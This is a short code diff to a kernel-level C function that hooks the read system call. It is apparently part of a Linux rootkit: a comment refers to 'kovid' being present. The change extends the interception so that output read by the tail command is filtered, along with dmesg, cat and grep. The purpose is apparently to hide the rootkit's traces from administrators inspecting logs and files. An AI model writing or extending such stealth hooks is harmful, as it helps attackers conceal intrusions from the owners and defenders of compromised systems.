@@ -228,11 +228,13 @@ static asmlinkage long m_read(struct pt_regs *regs) {
     if (!fs || !fs->filename)
         goto out;
 
+    /** special case :( */
     is_dmesg = !strcmp(fs->filename, "dmesg");
 
-    /** Apply only for dmesg & cat commands */
+    /** Apply only for a few commands */
     if ((!is_dmesg) &&
             (strcmp(fs->filename, "cat") != 0) &&
+            (strcmp(fs->filename, "tail") != 0) &&
             (strcmp(fs->filename, "grep") != 0))
         goto out;
 
@@ -250,7 +252,7 @@ static asmlinkage long m_read(struct pt_regs *regs) {
             goto out;
 
         /** if kovid is here, skip */
-        if (is_dmesg /** special case :( */ ||
+        if (is_dmesg ||
             is_sys_parent((unsigned int)PT_REGS_PARM1(regs)))
             rv=0;
     }
